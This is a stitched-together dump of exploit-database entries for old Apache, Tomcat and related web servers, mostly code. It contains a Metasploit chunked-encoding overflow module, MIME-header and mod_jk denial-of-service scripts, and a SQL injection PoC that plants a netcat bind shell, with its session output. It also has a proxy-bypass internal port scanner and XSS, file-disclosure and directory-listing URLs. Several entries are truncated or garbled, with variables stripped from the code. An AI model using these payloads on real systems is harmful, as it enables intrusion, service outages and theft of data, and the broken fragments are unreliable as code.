19536.exploit title: Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape Server 1.12/1.1/2.0 - a nph-test-cgi
19536.content:
"Apache <= 1.1,NCSA httpd <= 1.5.2,Netscape Commerce Server 1.12/Communications Server 1.1/Enterprise Server 2.0 a nph-test-cgi Vulnerability   \\r\
\\r\
source: https://www.securityfocus.com/bid/686/info\\r\
\\r\
Description as given by Josh Richards:\\r\
\\r\
A security hole exists in the nph-test-cgi script included in most UNIX based World Wide Web daemon distributions. The nph-* scripts exist to allow \'non-parsed headers\' to be sent via the HTTP protocol (this is not the cause of this security problem, though). The problem is that nph-test-cgi, which prints out information on the current web environment (just like \'test-cgi\' does) does not enclose its arguments to the \'echo\' command inside of quotes....shell escapes are not possible (or at least I have not found them to be--yet) but shell *expansion* is.... This means that _any_ remote user can easily browse your filesystem via the WWW.\\r\
\\r\
This is a bug with the nph-test-cgi script and _not_ the server itself. \\r\
\\r\
Enter the URL: <http://yourwebserver.com/cgi-bin/nph-test-cgi?*>\\r\
\\r\
Replace <yourwebserver.com> with the hostname of a server running a web\\r\
daemon near you. "

\ \ \ when "Oracle HTTP Server Powered by Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.22"\\r\

\ \ \ when "Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25"\\r\
\ \ \ \ print_status("This looks like an Oracle 9.2.0 Apache service (multiple tries allowed)")\\r\
\ \ \ when /IBM_HTTP_SERVER\\\\/1\\\\.3\\\\.(19\\\\.[3-9]|2[0-9]\\\\.)/\\r\

\ \ \ \ code = Exploit::CheckCode::Safe\\r\
\ \ \ when /Apache(-AdvancedExtranetServer)?\\\\/(1\\\\.([0-2]\\\\.[0-9]|3\\\\.([0-9][^0-9]|[0-1][0-9]|2[0-5]))|2\\\\.0.([0-9][^0-9]|[0-2][0-9]|3[0-8]))/\\r\
\ \ \ else\\r\

\ \ end\\r\
\\r\

\\r\
\ def auto_target\\r\
\ \ response = send_request_raw({\\\'uri\\\' => \\\'/\\\'}, 5)\\r\
\ \ if response.nil?\\r\
\ \ \ print_error("No response to request")\\r\
\ \ \ return targets_to_try\\r\
\ \ end\\r\
\\r\
\ \ http_fingerprint({ :response => response })  # Custom Server header matching / automatic target selection\\r\
\\r\
\ \ targets_to_try = []\\r\
\ \ server_hdr = response[\\\'Server\\\']\\r\
\ \ print_status("Server: #{server_hdr}")\\r\
\\r\
\ \ case server_hdr\\r\
\ \ when "Oracle HTTP Server Powered by Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.22"\\r\
\ \ \ targets_to_try.push(targets[9])\\r\
\\r\
\ \ when "Oracle HTTP Server Powered by Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.24"\\r\
\ \ \ targets_to_try.push(targets[10])\\r\
\\r\
\ \ when "Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25"\\r\
\ \ \ targets_to_try.push(targets[11])\\r\
\\r\
\ \ when /IBM_HTTP_SERVER\\\\/1\\\\.3\\\\.(19\\\\.[3-9]|2[0-9]\\\\.)/\\r\
\ \ \ # fall through\\r\
\\r\
\ \ else\\r\
\ \ \ # check for apache version ranges\\r\
\ \ \ if (server_hdr =~ /Apache\\\\/([^ ]*)/) or (server_hdr =~ /Apache-AdvancedExtranetServer\\\\/([^ ]*)/)\\r\
\ \ \ \ version = $1\\r\
\\r\
\ \ \ \ #print_status("Apache version: #{version}")\\r\
\ \ \ \ ver = version.split(\\\'.\\\')\\r\
\ \ \ \ if (ver.length == 3)\\r\
\ \ \ \ \ major = ver[0].to_i\\r\
\ \ \ \ \ minor = ver[1].to_i\\r\
\ \ \ \ \ rev = ver[2].to_i\\r\
\ \ \ \ \ if (major == 1 and minor == 3)\\r\
\ \ \ \ \ \ targets_to_try.push(targets[1]) if (rev >= 9 and rev <= 19)\\r\
\ \ \ \ \ \ targets_to_try.push(targets[2]) if (rev >= 22 and rev <= 24)\\r\
\ \ \ \ \ \ targets_to_try.push(targets[3]) if (rev >= 19 and rev <= 24)\\r\
\ \ \ \ \ \ targets_to_try.push(targets[4]) if (rev == 22)\\r\
\\r\
\ \ \ \ \ \ # Add the remaining targets, regardless of quality...\\r\
\ \ \ \ \ \ if (server_hdr =~ /Win32/)\\r\
\ \ \ \ \ \ \ # targets 4, 5, 6, 7\\r\
\ \ \ \ \ \ \ if (rev >= 17 and rev <= 24)\\r\
\ \ \ \ \ \ \ \ targets_to_try.push(targets[5])\\r\
\ \ \ \ \ \ \ \ targets_to_try.push(targets[6])\\r\
\ \ \ \ \ \ \ end\\r\
\ \ \ \ \ \ \ targets_to_try.push(targets[7])\\r\
\ \ \ \ \ \ \ targets_to_try.push(targets[8])\\r\
\ \ \ \ \ \ end\\r\
\ \ \ \ \ end\\r\
\ \ \ \ \ # Version 1.0 - 1.2, Fall through...\\r\
\ \ \ \ end\\r\
\ \ \ \ # ServerTokens setting isn\\\'t giving up enough information ...  Might need to try?\\r\
\ \ \ end\\r\
\ \ \ # Not Apache?  Fall through...\\r\
\ \ end\\r\
\\r\
\ \ targets_to_try\\r\
\ end\\r\
\\r\
\ #\\r\
\ # If auto, ask the auto_target function for a list of\\r\
\ # targets to try...\\r\
\ #\\r\
\ # If not auto, just try the selected target.\\r\
\ #\\r\
\ def exploit\\r\
\ \ if target_index == 0\\r\
\ \ \ targs = auto_target\\r\
\ \ \ print_status("Auto-targeting returned #{targs.length} candidates...")\\r\
\ \ \ targs.each_with_index { |targ, idx|\\r\
\ \ \ \ # Never try the debug target automatically :)\\r\
\ \ \ \ next if targ.name =~ /Debug/\\r\
\ \ \ \ exploit_target(targ)\\r\
\ \ \ }\\r\
\ \ else\\r\
\ \ \ exploit_target(target)\\r\
\ \ end\\r\
\ end\\r\
\\r\
\ def exploit_target(target)\\r\
\ \ target[\\\'Pad\\\'].each { |pad|\\r\
\ \ \ pattern =\\r\
\ \ \ \ rand_text_alphanumeric(3936) +\\r\
\ \ \ \ payload.encoded +\\r\
\ \ \ \ make_nops(6) + "\\\\xe9" + [-900].pack(\\\'V\\\') + "pP" +\\r\
\ \ \ \ rand_text_alphanumeric(pad)\\r\
\\r\
\ \ \ # Move slightly further back to allow padding changes\\r\
\ \ \ pattern +=\\r\
\ \ \ \ "\\\\xeb\\\\xf0\\\\xde\\\\xad" +\\r\
\ \ \ \ [target.ret].pack(\\\'V\\\')\\r\
\\r\
\ \ \ # Create a chain of return addresses and reverse jumps\\r\
\ \ \ 254.times { |x|\\r\
\ \ \ \ pattern +=\\r\
\ \ \ \ \ "\\\\xeb\\\\xf6\\\\xbe\\\\xef" +\\r\
\ \ \ \ \ [target.ret].pack(\\\'V\\\')\\r\
\ \ \ }\\r\
\\r\
\ \ \ # Even out the request length based on the padding value\\r\

\ \ \ pattern += rand_text_alphanumeric(8 - pad)\\r\

\ \ \ #\\r\

\ \ \ #\\r\

\ \ \ print_status("Trying #{target.name} [ #{"0x%.8x" % target.ret}/#{pad} ]")\\r\
\\r\
\ \ \ # Build the request\\r\
\ \ \ send_request_raw({\\r\

\ \ \ \ \ },\\r\
\ \ \ \ \\\'data\\\'    => "FFFFFFF0 " + pattern,\\r\
\ \ \ }, 2)\\r\
\\r\
\ \ \ # Check the handler\\r\
\ \ \ handler\\r\
\ \ }\\r\
\ end\\r\
\\r\
end\

\'// source: https://www.securityfocus.com/bid/5033/info\\r\
\\r\
When processing requests coded with the \\\'Chunked Encoding\\\' mechanism, Apache fails to properly calculate required buffer sizes. This is believed to be due to improper (signed) interpretation of an unsigned integer value. Consequently, several conditions that have security implications may occur. Reportedly, a buffer overrun and signal race condition occur. Exploiting these conditions may allow arbitrary code to run.\\r\
\\r\
**Update**: Reportedly, at least one worm is exploiting this vulnerability to propagate in the wild. The worm targets FreeBSD 4.5 systems running Apache 1.3.22-24 and 1.3.20. Other versions may also be affected.\\r\

20272.exploit title: Apache 1.2.5/1.3.1 / UnityMail 2.0 - MIME Header Denial of Service
20272.content:
\'source: https://www.securityfocus.com/bid/1760/info\\r\
\\r\
Apache Web Server and MessageMedia UnityMail are susceptible to a denial of service attack if a significant amount of 8000 byte MIME headers are sent. Both will crash and restart of the application is required in order to regain normal functionality. Other web servers may be also be vulnerable to this attack.\\r\
\\r\
#! /bin/perl\\r\
\\r\
# mimeflood.pl - 02/08/1998 - L.Facq (facq@u-bordeaux.fr)\\r\
\\r\
# Web servers / possible DOS Attack / "mime header flooding"\\r\
#\\r\
#       looking at the apache 1.2.5 source code i found\\r\
#       that there was no limit on how many mime headers could\\r\
#       be included in a client request. The only limits\\r\
#       are : 8192 byte for each header, 300 sec. on reading headers.\\r\
#\\r\
#       => by sending a crazy amount of 8000 bytes headers, it\\\'s possible\\r\
#       to consume a lot of memory (and of course CPU). The point\\r\
#       is that httpd daemons grow and STAY at this big size (or die\\r\
#       if you send too much)\\r\
#\\r\
#       -> may be a limit on mime header number could be added.\\r\
#\\r\
#       -> may be other web server could be vulnerable to this problem.\\r\
#\\r\
#       - i tried on an apache 1.2.5 -> it works\\r\
#       - i didnt installed 1.3.1 but looking at the source code,\\r\
#       i think the problem is there too.\\r\
#\\r\
##################################################\\r\
#From Roy T. Fielding / Sep 2 \\\'98 at 12:57 pm -420\\r\
#\\r\
#[...]\\r\
#>\\r\
#>       -> may be a limit on mime header number could be added.\\r\
#\\r\
#Such limits have already been added to 1.3.2-dev.\\r\
#\\r\
#.....Roy\\r\
\\r\
use Socket;\\r\
\\r\
# Usage : $0 host [port [max] ]\\r\
$max= 0;\\r\
if ($ARGV[2])\\r\
{\\r\
    $max= $ARGV[2];\\r\
}\\r\
\\r\
$proto = getprotobyname(\\\'tcp\\\');\\r\
socket(Socket_Handle, PF_INET, SOCK_STREAM, $proto);\\r\
$port = 80;\\r\
if ($ARGV[1])\\r\
{\\r\
    $port= $ARGV[1];\\r\
}\\r\
$host = $ARGV[0];\\r\
$sin = sockaddr_in($port,inet_aton($host));\\r\
\\r\
connect(Socket_Handle,$sin);\\r\
send Socket_Handle,"GET / HTTP/1.0\\\
",0;\\r\
$val= (\\\'z\\\'x8000)."\\\
";\\r\
$n= 1;\\r\
$|= 1;\\r\
while (Socket_Handle)\\r\
{\\r\
    send Socket_Handle,"Stupidheader$n: ",0;\\r\
    send Socket_Handle,$val,0;\\r\
    $n++;\\r\
    if (!($n % 100))\\r\
    {\\r\
        print "$n\\\
";\\r\
    }\\r\
\\r\
    if ($max && ($n > $max))\\r\
    {\\r\
        last;\\r\
    }\\r\
}\\r\
print "Done: $n\\\
";\\r\
send Socket_Handle,"\\\
",0;\\r\
\\r\
while (<Socket_Handle>)\\r\
{\\r\
    print $_;\\r\
}\

28653.content:
\'   - Affected Vendor: http://sourceforge.net/projects/mod-acct/files/\\r\
   - Affected Software: mod_accounting\\r\
   - Affected Version: 0.5. Other earlier versions may be affected.\\r\
   - Issue type: Blind SQL injection\\r\
   - Release Date: 20 Sep 2013\\r\
   - Discovered by: Eldar "Wireghoul" Marcussen\\r\
   - CVE Identifier: CVE-2013-5697\\r\
   - Issue status: Abandoned software, no patch available\\r\
\\r\
Summary\\r\
\\r\
mod_accounting is a traffic accounting module for Apache 1.3.x which\\r\
records traffic numbers in a database. Both MySQL and PostgreSQL database\\r\
types are supported. It supports arbitrary database designs as traffic\\r\
recording is performed via a user defined query in the Apache configuration\\r\
using placeholders for received values. The following is an example\\r\
configuration:\\r\
\\r\
<VirtualHost _default_:*>\\r\
DocumentRoot "/var/www/"\\r\
Options Indexes\\r\
AccountingQueryFmt "INSERT INTO accounting VALUES( current_time, %r, %s,\\r\
\\\'%u\\\', \\\'%h\\\' );"\\r\
AccountingDatabase accounting\\r\
AccountingDatabaseDriver postgres\\r\
AccountingDBHost localhost 5432\\r\
AccountingLoginInfo acct acct\\r\
</VirtualHost>\\r\
\\r\
As user supplied values are not sanitised before being used in the\\r\
placeholder values it is possible for an attacker to supply malicous values\\r\
to perform blind SQL injection.\\r\
\\r\
\\r\
Description\\r\
\\r\
The SQL injection occurs due to a user supplied HTTP header being used in\\r\
the query without sanitisation. The module uses a simple string\\r\
concatination approach to modify the placeholders in the user defined query\\r\
before sending it to the database. This code can be located in\\r\
mod_accounting.c:\\r\
\\r\
409: // build the query string from the template\\r\
410: while( ptr ) {\\r\
411:     char *next;\\r\
412:\\r\
413:     next = strchr( ptr, \\\'%\\\' );\\r\
414:\\r\
415:     if( next ) {\\r\
416:         char       tmp[ 2 ];\\r\
417:\\r\
418:         *next++ = \\\'\\\\0\\\';\\r\
419:\\r\
420:         switch( *next++ ) {\\r\
421:\\r\
422:             case \\\'h\\\':\\r\
423:                 query = ap_pstrcat( p, query, ptr, cfg->ServerName ?\\r\
cfg->ServerName : "-", NULL );\\r\
424:                 break;\\r\
425:\\r\
426:             case \\\'s\\\':\\r\
427:                 query = ap_pstrcat( p, query, ptr, sent, NULL );\\r\
428:                 break;\\r\
429:\\r\
430:             case \\\'r\\\':\\r\
431:                 query = ap_pstrcat( p, query, ptr, recvd, NULL );\\r\
432:                 break;\\r\
433:\\r\
434:             case \\\'u\\\':\\r\
435:                 query = ap_pstrcat( p, query, ptr, get_user( r ), NULL\\r\
);\\r\
436:                 break;\\r\
437:\\r\
438:             default:\\r\
439:                 tmp[0] = next[ -1 ];\\r\
440:                 tmp[1] = \\\'\\\\0\\\';\\r\
441:\\r\
442:                 query = ap_pstrcat( p, query, ptr, tmp, NULL );\\r\
443:                 break;\\r\
444:         }\\r\
445:\\r\
446:         next[ -2 ] = \\\'%\\\';\\r\
447:\\r\
448:     } else\\r\
449:         query = ap_pstrcat( p, query, ptr, NULL );\\r\
450:\\r\
451:     ptr = next;\\r\
452: }\\r\
453:\\r\
454: ( *DBDrivers[ cfg->DBDriver ].Query )( cfg, server, p, query );\\r\
455:\\r\
456: cfg->Received = cfg->Sent = 0;\\r\
\\r\
It is important to note that the database query takes place after the page\\r\
has been served, hence there is no easy way to determine if a particular\\r\
injection method was successful apart from using an out of band approach.\\r\
However, as the injection occurs in an insert statement it is likely that\\r\
the successful injection vector is one of about a handful of likely\\r\
candidates.\\r\
\\r\
\\r\
Impact\\r\
\\r\
An attacker is only limited by the capabilities of the database\\r\
configuration and may be able to read, add, alter or delete data from your\\r\
database(s), read or write arbitrary files or even execute commands on the\\r\
server given a privileged database account.\\r\
\\r\
\\r\
Proof of Concept\\r\
\\r\
root@bt:~/sploit-dev# cat mod_accounting-rce.pl\\r\
#!/usr/bin/perl\\r\
# PoC of blind SQL injection in the mod_accounting/0.5 Apache module\\r\
# Injection can occur via the Host header\\r\
# As the injection occurs in a user defined insert statement a bit of trial\\r\
and error is required\\r\
# Database operations occurs asyncronous to page response so timing attacks\\r\
wont work\\r\
# This one is completely blind\\r\
# DB can be mysql or postgres, this PoC only covers postgres\\r\
# PoC executes netcat to listen on port 4444 (requires dba privileges)\\r\
use IO::Socket::INET;\\r\
\\r\
print "#----------------------------------------------#\\\
";\\r\
print "| mod_accounting/0.5 PoC exploit by \\\\@Wireghoul |\\\
";\\r\
print "|          www.justanotherhacker.com           |\\\
";\\r\
print "#----------Command execution via SQLi----------#\\\
";\\r\
print "[*] Enumerating blind injection vectors:\\\
";\\r\
\\r\
my @endings = ("\\\'));", \\\'"));\\\', "));", "\\\');", \\\'");\\\', ");", "\\\';", \\\'";\\\',";");\\r\
# These should terminate most insert statements\\r\
#my @endings = ( "\\\');" );\\r\
my $shell = \\\'nc -lnp 4444 -e /bin/sh\\\';\\r\
my $cnt = 0;\\r\
my $content = "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS\\r\
\\\'/lib/libc.so.6\\\', \\\'system\\\' LANGUAGE \\\'C\\\' STRICT; SELECT system(\\\'$shell\\\');";\\r\
foreach $end (@endings) {\\r\
  $cnt++;\\r\
  my $sock = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]") or die "Unable to\\r\
connect to $ARGV[0]:$ARGV[1]: $!\\\
";\\r\
  my $str = "GET / HTTP/1.1\\\\r\\\
Host: $ARGV[0]$cnt$end $content --\\r\
\\\\r\\\
\\\\r\\\
"; # from mysql.user into outfile \\\'/tmp/pocpoc$cnt.txt\\\'; --\\r\
\\\\r\\\
\\\\r\\\
";\\r\
  print "[-] Trying $end\\\
";\\r\
  print $sock $str;\\r\
  #print "Sent $end\\\
";\\r\
  close ($sock);\\r\
}\\r\
print "[*] Done, remote server should have executed $shell\\\
";\\r\
\\r\
\\r\
Execution of PoC:\\r\
--------------------------------------------------\\r\
root@bt:~/sploit-dev# nc 192.168.58.138 4444\\r\
(UNKNOWN) [192.168.58.138] 4444 (?) : Connection refused\\r\
root@bt:~/sploit-dev# perl mod_accounting-rce.pl 192.168.58.138 80\\r\
#----------------------------------------------#\\r\
| mod_accounting/0.5 PoC exploit by @Wireghoul |\\r\
|          www.justanotherhacker.com           |\\r\
#----------Command execution via SQLi----------#\\r\
[*] Enumerating blind injection vectors:\\r\
[-] Trying \\\'));\\r\
[-] Trying "));\\r\
[-] Trying ));\\r\
[-] Trying \\\');\\r\
[-] Trying ");\\r\
[-] Trying );\\r\
[-] Trying \\\';\\r\
[-] Trying ";\\r\
[-] Trying ;\\r\
[*] Done, remote server should have executed nc -lnp 4444 -e /bin/sh\\r\
root@bt:~/sploit-dev# nc 192.168.58.138 4444\\r\
pwd\\r\
/var/lib/postgres/data/base/17142\\r\
id\\r\
uid=101(postgres) gid=104(postgres) groups=104(postgres)\\r\
hostname\\r\
sarge\\r\
^C\\r\
\\r\
Solution\\r\
\\r\
As the module is no longer supported, discontinue the use of this module.\\r\
\\r\
\\r\
Response Timeline\\r\
\\r\
   - 03/09/2013 - Vendor notified\\r\
   - 03/09/2013 - Vendor acknowledge vulnerability\\r\
   - 04/09/2013 - Project download removed and website updated to reflect\\r\
   new status\\r\
   - 20/09/2013 - Advisory released\

36352.exploit title: Apache 7.0.x mod_proxy - Reverse Proxy Security Bypass
36352.content:
"b'source: https://www.securityfocus.com/bid/50802/info\\r\
\\r\
Apache HTTP Server is prone to a security-bypass vulnerability.\\r\
\\r\
Successful exploits will allow attackers to bypass certain security restrictions and obtain sensitive information about running web applications. \\r\
\\r\
The following example patterns are available:\\r\
\\r\
RewriteRule ^(.*) http://www.example.com$1\\r\
ProxyPassMatch ^(.*) http://www.example.com$1 '"

\'#!/usr/bin/env python\\r\
\\r\
import socket\\r\
import string\\r\
import getopt, sys\\r\
\\r\
\\r\
known_ports = [0,21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080]\\r\
\\r\
def send_request(url, apache_target, apache_port, internal_target, internal_port, resource):\\r\
\\r\
\ get = "GET " + url + "@" + internal_target + ":" + internal_port +  "/" + resource + " HTTP/1.1\\\\r\\\
"\\r\
\ get = get + "Host: " + apache_target + "\\\\r\\\
\\\\r\\\
"\\r\
\ \\r\
\ remoteserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\r\
\ remoteserver.settimeout(3)\\r\
\\r\
\ try:\\r\
\ \ remoteserver.connect((apache_target, int(apache_port)))\\r\
\ \ remoteserver.send(get)\\r\
\ \ return remoteserver.recv(4096)\\r\
\ except:\\r\
\ \ return ""\\r\
\\r\
def get_banner(result):\\r\
\ return result[string.find(result, "\\\\r\\\
\\\\r\\\
")+4:]\\r\
\\r\
\\r\
def scan_host(url, apache_target, apache_port, internal_target, tested_ports, resource):\\r\
\\r\
\ print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource)\\r\
\ for port in tested_ports:\\r\
\ \ port = str(port)\\r\
\ \ result = send_request(url, apache_target, apache_port, internal_target, port, resource)\\r\
\ \ if string.find(result,"HTTP/1.1 200")!=-1 or \\\\\\r\
\ \ string.find(result,"HTTP/1.1 30")!=-1 or \\\\\\r\
\ \ string.find(result,"HTTP/1.1 502")!=-1:\\r\
\ \ \ print "- Open port: " + port + "/TCP"\\r\
\ \ \ print get_banner(result)\\r\
\ \ elif len(result)==0:\\r\
\  \ \ print "- Filtered port: " + port + "/TCP"\\r\
\ \ else:\\r\
\  \ \ print "- Closed port: " + port + "/TCP"\\r\
\ \ \ \\r\
\\r\
def usage():\\r\
\ print\\r\
\ print "CVE-2011-3368 proof of concept by Rodrigo Marcos"\\r\
\ print "http://www.secforce.co.uk"\\r\
\ print\\r\
\ print "usage():"\\r\
\ print "python apache_scan.py [options]"\\r\
\ print\\r\
\ print " [options]"\\r\
\ print "\ \ -r: Remote Apache host"\\r\
\ print "\ \ -p: Remote Apache port (default is 80)"\\r\
\ print "\ \ -u: URL on the remote web server (default is /)"\\r\
\ print "\ \ -d: Host in the DMZ (default is 127.0.0.1)"\\r\
\ print "\ \ -e: Port in the DMZ (enables \\\'single port scan\\\')"\\r\
\ print "\ \ -g: GET request to the host in the DMZ (default is /)"\\r\
\ print "\ \ -h: Help page"\\r\
\ print\\r\
\ print "examples:"\\r\
\ print " - Port scan of the remote host"\\r\
\ print "\ \ python apache_scan.py -r www.example.com -u /images/test.gif"\\r\
\ print " - Port scan of a host in the DMZ"\\r\
\ print "\ \ python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local"\\r\
\ print " - Retrieve a resource from a host in the DMZ"\\r\
\ print "\ \ python apache_scan.py -r www.example.com -u /images/test.gif -d internalhost.local -e 80 -g /accounts/index.html"\\r\
\ print\\r\
\\r\
def print_banner(url, apache_target, apache_port, internal_target, tested_ports, resource):\\r\
\ print\\r\

\ print "http://www.secforce.co.uk"\\r\

\ print " [+] Internal host: " + internal_target\\r\
\ print " [+] Tested ports: " + str(tested_ports)\\r\
\ print " [+] Internal resource: " + resource\\r\
\ print\\r\
\\r\
\\r\
def main():\\r\
\\r\
\ global apache_target\\r\
\ global apache_port\\r\
\ global url\\r\
\ global internal_target\\r\
\ global internal_port\\r\
\ global resource\\r\
\\r\
\ try:\\r\
\ \ opts, args = getopt.getopt(sys.argv[1:], "u:r:p:d:e:g:h", ["help"])\\r\
\ except getopt.GetoptError:\\r\
\ \ usage()\\r\
\ \ sys.exit(2)\\r\
\\r\
\ try:\\r\
\ \ for o, a in opts:\\r\
\ \ \ if o in ("-h", "--help"):\\r\
\ \ \ \ usage()\\r\
\ \ \ \ sys.exit(2)\\r\
\ \ \ if o == "-u":\\r\
\ \ \ \ url=a\\r\
\ \ \ if o == "-r":\\r\
\ \ \ \ apache_target=a\\r\
\ \ \ if o == "-p":\\r\
\ \ \ \ apache_port=a\\r\
\ \ \ if o == "-d":\\r\

\ \ \ if o == "-e":\\r\
\ \ \ \ internal_port=a\\r\
\ \ \ if o == "-g":\\r\
\ \ \ \ resource=a\ \ \ \ \\r\
\ \ \\r\
\ except getopt.GetoptError:\\r\
\ \ usage()\\r\
\ \ sys.exit(2)\\r\
\ \ \\r\
\ if apache_target == "":\\r\
\ \ usage()\\r\
\ \ sys.exit(2)\\r\
\\r\

apache_port = "80"\\r\

\\r\
main()\\r\

22068.exploit title: Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk - Chunked Encoding Denial of Service
22068.content:
\'source: https://www.securityfocus.com/bid/6320/info\\r\
\\r\
Apache Webserver and Tomcat are HTTP servers maintained and distributed by the Apache project. Apache Webserver and Tomcat are available for the Unix, Linux, and Microsoft Windows platforms.\\r\
\\r\
It has been reported that a denial of service exists in Apache Webserver and Tomcat when mod_jk is used. Due to design problems in the module, a user submitting malicious requests to the Apache Webserver may cause desynchronization between Apache and Tomcat. This could be done through malicious chunked encoding requests.\\r\
\\r\
#!/usr/bin/perl -w\\r\
\\r\
use IO::Socket;\\r\
\\r\
 = "Apache 1.3.x, Tomcat 4.x Server, mod_jk 1.2 using Apache Jserv\\r\
Protocol 1.3";\\r\
\\r\
unless (@ARGV == 1) {\\r\
  print "\\\
 By Sapient2003\\\
";\\r\
  die "usage: -bash <host to exploit>\\\
";\\r\
}\\r\
print "\\\
 By Sapient2003\\\
";\\r\
\\r\
 = "GET / HTTP/1.0\\\
Host: [0]\\\
Transfer-ENcoding:\\r\
Chunked\\\
53636f7474";\\r\
\\r\
 = IO::Socket::INET->new(\\r\
        PeerAddr => [0],\\r\
        PeerPort => 69,\\r\
        Proto    => "udp",\\r\
) or die "Can\\\'t find host [0]\\\
";\\r\
print  ;\\r\
print "Attempted to exploit [0]\\\
";\\r\
close();\

21885.exploit title: Apache 1.3/2.0.x - Server Side Include Cross-Site Scripting
21885.content:
"b'source: https://www.securityfocus.com/bid/5847/info\\r\
\\r\
Apache is reported to be vulnerable to cross site scripting attacks. This vulnerability is due to the SSI error pages of the webserver not being properly sanitized of malicious HTML code.\\r\
\\r\
Attacker-supplied HTML and script code may be executed on a web client visiting the malicious link in the context of the webserver.\\r\
\\r\
Attacks of this nature may make it possible for attackers to manipulate web content or to steal cookie-based authentication credentials. It may be possible to take arbitrary actions as the victim user.\\r\
\\r\
http://%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28document%2Ecookie%29%22\\r\
%3E.apachesite.org/raise_404 '"

"b'source: https://www.securityfocus.com/bid/2060/info\\r\
\\r\
Apache Web Server is subject to disclose files to unauthorized users when used in conjunction with the PHP3 script language.\\r\
\\r\
By requesting a specially crafted URL by way of php, it is possible for a remote user to gain read access to a known file that resides on the target host.\\r\
\\r\
Successful exploitation of this vulnerability could lead to the disclosure of sensitive information and possibly assist in further attacks against the victim. \\r\
\\r\
http://target/index.php3.%5c../..%5cconf/httpd.conf '"

19975.content:
\'source: https://www.securityfocus.com/bid/1284/info\\r\
\\r\
Apache HTTP Server 1.3.x (win32) allows people to get a directory listing of a directory, if it is enabled in the config, even if an index file is present that would normally be displayed instead. This can be achieved by sending a number of "/" characters appended to an HTTP request to the server. (eg: http://www.host.com///////////////////////////////////////////////////////...) When apache calls stat() to check if the index.html (for example) exists, Windows will return an error if the path is too long. Apache incorrectly treats this as if the file does not exist. Different numbers of "/"s are required based on the length of the path to the DocumentRoot. \\r\
\\r\
#!/usr/bin/perl\\r\
\\r\
use LWP::Simple;\\r\
use strict;\\r\
\\r\
my $host = shift() || die "usage:  $ARGV[0] [hostname]";\\r\
my $cnt;\\r\
my $data;\\r\
my $odata;\\r\
my $i;\\r\
\\r\
$odata = get("http://$host/");\\r\
if ($odata eq "")\\r\
{\\r\
    die "no response from server:  $host\\\
";\\r\
}\\r\
for ($i = 2; $i < 4096; $i++)\\r\
{\\r\
    print "Trying $i...\\\
";\\r\
    $data = get("http://$host" . ("/" x $i));\\r\
    if ($data ne $odata)\\r\
    {\\r\
        print "/ = $i\\\
\\\
$data\\\
\\\
";\\r\
        exit;\\r\
    }\\r\
}\

21204.content:
"b'source: https://www.securityfocus.com/bid/3786/info\\r\
\\r\
A vulnerability exists in the suggested default configuration for the Apache PHP.EXE binary on Microsoft Windows platforms. This issue has the potential to disclose the contents of arbitrary files to remote attackers.\\r\
\\r\
As a result, it is possible for an attacker to append a filepath to the end of web request for php.exe. Files targetted in this manner will be served to the attacker.\\r\
\\r\
It is also possible to run executables in the PHP directory via successful exploitation of this vulnerability.\\r\
\\r\
http://[targethost]/php/php.exe?c:\\\\[filepath] '"

20692.exploit title: Apache 1.3 - Artificially Long Slash Path Directory Listing (1)
20692.content:
\'source: https://www.securityfocus.com/bid/2503/info\\r\
\\r\
Apache HTTPD is the Apache Web Server, freely distributed and actively maintained by the Apache Software Foundation. It is a freely available and widely used software package, included with various implementations of the UNIX operating system and can be used on Microsoft Windows operating systems.\\r\
\\r\
A problem in the package could allow directory indexing and path discovery. In a default configuration, Apache enables mod_dir, mod_autoindex, and mod_negotiation. However, by sending the Apache server a custom-crafted request consisting of a long path name created artificially by using numerous slashes, an attacker can cause these modules to misbehave, allowing the attacker to escape the error page and to gain a listing of the directory contents.\\r\
\\r\
This vulnerability allows a malicious remote user to launch an information-gathering attack, which could potentially result in a compromise of the system. Additionally, this vulnerability affects all releases of Apache previous to 1.3.19. \\r\
\\r\
#!/usr/bin/perl\\r\
#\\r\
# orginal by farm9, Inc. (copyright 2001)\\r\
# then modified by Siberian (www.sentry-labs.com)\\r\
# with more modifications by rfp (www.wiretrip.net/rfp/)\\r\
#\\r\
##########################################################################\\r\
\\r\
use libwhisker;\\r\
use Getopt::Std;\\r\
\\r\
# apache3.pl\\r\
# this exploit was modified to use the libwhisker library, which gives\\r\
# HTTP/1.1, proxy, and SSL support.  Plus, small other changes.\\r\
\\r\
$|++;\\r\
my (%hin,%hout,%args);\\r\
\\r\
print "Apache Artificially Long Slash Path Directory Listing Exploit\\\
";\\r\
print "SecurityFocus BID 2503\\\
\\\
";\\r\
print "Original exploit code written by Matt Watchinski (www.farm9.com)\\\
";\\r\
print "Rewritten and fixed by Siberian (www.sentry-labs.com)\\\
";\\r\
print "Moved to libwhisker by rfp\\\
\\\
";\\r\
\\r\
getopts("p:L:H:sP:R:h:",\\\\%args);\\r\
\\r\
if($args{h} eq \\\'\\\'){\\r\
 print \\\'Usage: ./apache3.pl <options>, where options:\\\',"\\\
";\\r\
 print \\\'-h host  host to scan (must be specified)\\\',"\\\
";\\r\
 print \\\'-p ##\  host port (default: 80)\\\',"\\\
";\\r\
 print \\\'-L ##\  low end/start of range (default: 1)\\\',"\\\
";\\r\
 print \\\'-H ##\  high end/end of range (default: 8192)\\\',"\\\
";\\r\
 print \\\'-P host\  HTTP proxy via host\\\',"\\\
";\\r\
